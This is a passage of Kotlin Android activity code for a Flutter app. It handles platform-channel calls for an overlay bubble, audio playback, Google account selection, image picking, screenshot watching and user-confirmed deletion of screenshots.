                            player = MediaPlayer().apply {
                                setDataSource(path)
                                prepare()
                                start()
                            }
                            result.success(1)
                        } catch (e: Exception) {
                            result.success(0)
                        }
                    }
                    "toast" -> {
                        val m = call.arguments as? String ?: ""
                        Toast.makeText(applicationContext, m, Toast.LENGTH_SHORT).show()
                        result.success(1)
                    }
                    "errorPop" -> {
                        val m = call.arguments as? String ?: ""
                        BubbleService.showError(this, m)
                        result.success(1)
                    }
                    "canOverlay" -> result.success(Settings.canDrawOverlays(this))
                    "openOverlaySettings" -> {
                        try {
                            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
                            result.success(1)
                        } catch (e: Exception) {
                            result.success(0)
                        }
                    }
                    "showBubble" -> {
                        BubbleService.show(this)
                        result.success(1)
                    }
                    "hideBubble" -> {
                        BubbleService.hide(this)
                        result.success(1)
                    }
                    "bubbleAlive" -> result.success(BubbleService.instance != null)
                    "updateBubble" -> {
                        BubbleService.bText = call.argument<String>("text") ?: BubbleService.bText
                        BubbleService.bHtf = call.argument<Int>("htf") ?: BubbleService.bHtf
                        BubbleService.bEntry = call.argument<Int>("entry") ?: BubbleService.bEntry
                        BubbleService.bCorr = call.argument<Int>("corr") ?: BubbleService.bCorr
                        BubbleService.bActive = call.argument<String>("active") ?: "none"
                        BubbleService.bCapture = (call.argument<Int>("capture") ?: 1) == 1
                        BubbleService.instance?.refresh()
                        result.success(1)
                    }
                    else -> result.notImplemented()
                }
            }
    }

    private fun pickGoogleAccount(result: MethodChannel.Result) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
            pendingAccount = result
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.GET_ACCOUNTS), ACCOUNT_REQ)
            return
        }
        showAccountPicker(result)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == ACCOUNT_REQ) {
            val res = pendingAccount
            pendingAccount = null
            if (res != null) showAccountPicker(res)
        }
    }

    private fun showAccountPicker(result: MethodChannel.Result) {
        try {
            val am = AccountManager.get(this)
            val accounts = am.getAccountsByType("com.google")
            if (accounts.isEmpty()) {
                result.success(null)
                return
            }
            val names = accounts.map { it.name }.toTypedArray()
            val builder = AlertDialog.Builder(this)
            builder.setTitle("Choose Gmail")
            builder.setItems(names) { d, which ->
                d.dismiss()
                result.success(names[which])
            }
            builder.setOnCancelListener { result.success(null) }
            builder.show()
        } catch (e: Exception) {
            result.success(null)
        }
    }

    private fun launchPicker(max: Int = 6) {
        val intent = if (Build.VERSION.SDK_INT >= 33) {
            Intent(MediaStore.ACTION_PICK_IMAGES).apply {
                type = "image/*"
                putExtra(MediaStore.EXTRA_PICK_IMAGES_MAX, max)
            }
        } else {
            Intent(Intent.ACTION_GET_CONTENT).apply {
                type = "image/*"
                addCategory(Intent.CATEGORY_OPENABLE)
                putExtra(Intent.EXTRA_ALLOW_MULTIPLE, max > 1)
            }
        }
        try {
            startActivityForResult(intent, PICK_REQ)
        } catch (e: Exception) {
            pendingPick?.success(emptyList<String>())
            pendingPick = null
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == PICK_REQ) {
            val res = pendingPick
            pendingPick = null
            if (res != null) {
                val paths = mutableListOf<String?>()
                if (resultCode == Activity.RESULT_OK && data != null) {
                    val clip = data.clipData
                    if (clip != null) {
                        for (i in 0 until clip.itemCount) {
                            paths.add(uriToPath(clip.getItemAt(i).uri))
                        }
                    } else {
                        data.data?.let { paths.add(uriToPath(it)) }
                    }
                }
                res.success(paths.filterNotNull())
            }
            return
        }
        if (requestCode == 9001) {
            val res = pendingDeleteResult
            pendingDeleteResult = null
            if (res != null) {
                res.success(if (resultCode == Activity.RESULT_OK) 1 else 0)
            }
            return
        }
        super.onActivityResult(requestCode, resultCode, data)
    }

    private fun uriToPath(uri: Uri): String? {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return copyUriToCacheForPick(uri)
        }
        val proj = arrayOf(MediaStore.Images.Media.DATA)
        contentResolver.query(uri, proj, null, null, null)?.use { c ->
            if (c.moveToFirst()) {
                val idx = c.getColumnIndex(MediaStore.Images.Media.DATA)
                if (idx >= 0) {
                    val p = c.getString(idx)
                    if (!p.isNullOrEmpty()) return p
                }
            }
        }
        return copyUriToCacheForPick(uri)
    }

    private fun copyUriToCacheForPick(uri: Uri): String? {
        return try {
            val cacheFile = File(cacheDir, "pick_${System.currentTimeMillis()}.png")
            contentResolver.openInputStream(uri)?.use { input ->
                FileOutputStream(cacheFile).use { output -> input.copyTo(output) }
            }
            cacheFile.absolutePath
        } catch (e: Exception) {
            null
        }
    }

    private fun handleDelete(ids: List<Long>, paths: List<String>, result: MethodChannel.Result) {
        val uris = mutableListOf<Uri>()
        for (id in ids) {
            val u = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
            try {
                contentResolver.query(u, arrayOf(MediaStore.Images.Media._ID), null, null, null)?.use { c ->
                    if (c.moveToFirst()) uris.add(u)
                }
            } catch (e: Exception) {
            }
        }
        if (uris.isEmpty()) {
            for (p in paths) {
                uriForPath(p)?.let { uris.add(it) }
            }
        }
        if (uris.isEmpty()) {
            result.success(0)
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val pendingIntent = MediaStore.createDeleteRequest(contentResolver, uris)
                Toast.makeText(applicationContext, "Tap Allow in system dialog — SS will be deleted", Toast.LENGTH_LONG).show()
                pendingDeleteResult = result
                startIntentSenderForResult(pendingIntent.intentSender, 9001, null, 0, 0, 0)
            } catch (e: Exception) {
                pendingDeleteResult = null
                result.error("DELETE_FAILED", e.message, null)
            }
            return
        }

        var deletedAny = false
        var recoverableHandled = false
        for (u in uris) {
            try {
                if (contentResolver.delete(u, null, null) > 0) deletedAny = true
            } catch (se: SecurityException) {
                if (Build.VERSION.SDK_INT == Build.VERSION_CODES.Q && se is RecoverableSecurityException && !recoverableHandled) {
                    recoverableHandled = true
                    try {
                        pendingDeleteResult = result
                        startIntentSenderForResult(se.userAction.actionIntent.intentSender, 9001, null, 0, 0, 0)
                        return
                    } catch (ignored: Exception) {
                        pendingDeleteResult = null
                    }
                }
            } catch (e: Exception) {
            }
        }
        result.success(if (deletedAny) 1 else 0)
    }

    private fun uriForPath(path: String): Uri? {
        val projection = arrayOf(MediaStore.Images.Media._ID)
        val selection = MediaStore.Images.Media.DATA + "=?"
        val selectionArgs = arrayOf(path)
        val cursor: Cursor? = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            selection,
            selectionArgs,
            null
        )
        var resultUri: Uri? = null
        if (cursor != null) {
            if (cursor.moveToFirst()) {
                val id = cursor.getLong(0)
                resultUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
            }
            cursor.close()
        }
        return resultUri
    }

    private fun startWatcher() {
        watcher = ShotWatcher(applicationContext, Handler(Looper.getMainLooper())) { id, path ->
            screenshotChannel?.invokeMethod("onScreenshot", hashMapOf<String, Any>("id" to id, "path" to path))
        }
        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            watcher!!
        )
    }

    override fun onDestroy() {
        watcher?.let { contentResolver.unregisterContentObserver(it) }
        player?.release()
        super.onDestroy()
    }
}
